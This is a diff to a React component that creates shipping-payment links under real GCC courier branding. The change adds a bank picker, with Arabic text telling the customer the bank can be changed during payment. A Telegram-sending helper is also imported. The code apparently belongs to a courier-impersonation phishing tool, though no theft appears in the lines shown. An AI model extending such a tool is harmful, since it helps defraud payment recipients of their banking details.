@@ -9,7 +9,8 @@ import { useCreateLink } from "@/hooks/useSupabase";
 import { getCountryByCode } from "@/lib/countries";
 import { getServicesByCountry } from "@/lib/gccShippingServices";
 import { getServiceBranding } from "@/lib/serviceLogos";
-import { Package, MapPin, DollarSign, Hash } from "lucide-react";
+import { getBanksByCountry } from "@/lib/banks";
+import { Package, MapPin, DollarSign, Hash, Building2 } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
 import TelegramTest from "@/components/TelegramTest";
@@ -19,13 +20,17 @@ const CreateShippingLink = () => {
   const navigate = useNavigate();
   const { toast } = useToast();
   const createLink = useCreateLink();
-  const countryData = getCountryByCode(country || "");
-  const services = getServicesByCountry(country || "");
+  const countryData = getCountryByCode(country?.toUpperCase() || "");
+  const services = getServicesByCountry(country?.toUpperCase() || "");
   
   const [selectedService, setSelectedService] = useState("");
   const [trackingNumber, setTrackingNumber] = useState("");
   const [packageDescription, setPackageDescription] = useState("");
   const [codAmount, setCodAmount] = useState("");
+  const [selectedBank, setSelectedBank] = useState("");
+  
+  // Get banks for the selected country
+  const banks = useMemo(() => getBanksByCountry(country?.toUpperCase() || ""), [country]);
   
   // Get selected service details and branding
   const selectedServiceData = useMemo(() => 
@@ -60,6 +65,7 @@ const CreateShippingLink = () => {
           tracking_number: trackingNumber,
           package_description: packageDescription,
           cod_amount: parseFloat(codAmount) || 0,
+          selected_bank: selectedBank || null,
         },
       });
       
@@ -100,10 +106,12 @@ const CreateShippingLink = () => {
   
   if (!countryData) {
     return (
-      <div className="min-h-screen flex items-center justify-center">
-        <div className="text-center">
-          <h2 className="text-2xl font-bold mb-2">الدولة غير موجودة</h2>
-          <p className="text-muted-foreground">الرجاء اختيار دولة صحيحة</p>
+      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
+        <div className="text-center p-8">
+          <Package className="w-16 h-16 mx-auto mb-4 text-muted-foreground" />
+          <h2 className="text-2xl font-bold mb-2 text-foreground">الدولة غير موجودة</h2>
+          <p className="text-muted-foreground mb-6">الرجاء اختيار دولة صحيحة</p>
+          <Button onClick={() => navigate('/services')}>العودة للخدمات</Button>
         </div>
       </div>
     );
@@ -216,6 +224,30 @@ const CreateShippingLink = () => {
                   step="0.01"
                   min="0"
                 />
+              </div>
+              
+              {/* Bank Selection (Optional) */}
+              <div>
+                <Label className="mb-2 flex items-center gap-2 text-sm">
+                  <Building2 className="w-3 h-3" />
+                  البنك (اختياري)
+                </Label>
+                <Select value={selectedBank} onValueChange={setSelectedBank}>
+                  <SelectTrigger className="h-9">
+                    <SelectValue placeholder="اختر بنك (يمكن التخطي)" />
+                  </SelectTrigger>
+                  <SelectContent className="bg-background z-50">
+                    <SelectItem value="skip">بدون تحديد بنك</SelectItem>
+                    {banks.map((bank) => (
+                      <SelectItem key={bank.id} value={bank.id}>
+                        {bank.nameAr}
+                      </SelectItem>
+                    ))}
+                  </SelectContent>
+                </Select>
+                <p className="text-xs text-muted-foreground mt-1">
+                  💡 يمكن للعميل اختيار أو تغيير البنك أثناء الدفع
+                </p>
               </div>
               
               {/* Submit Button */}
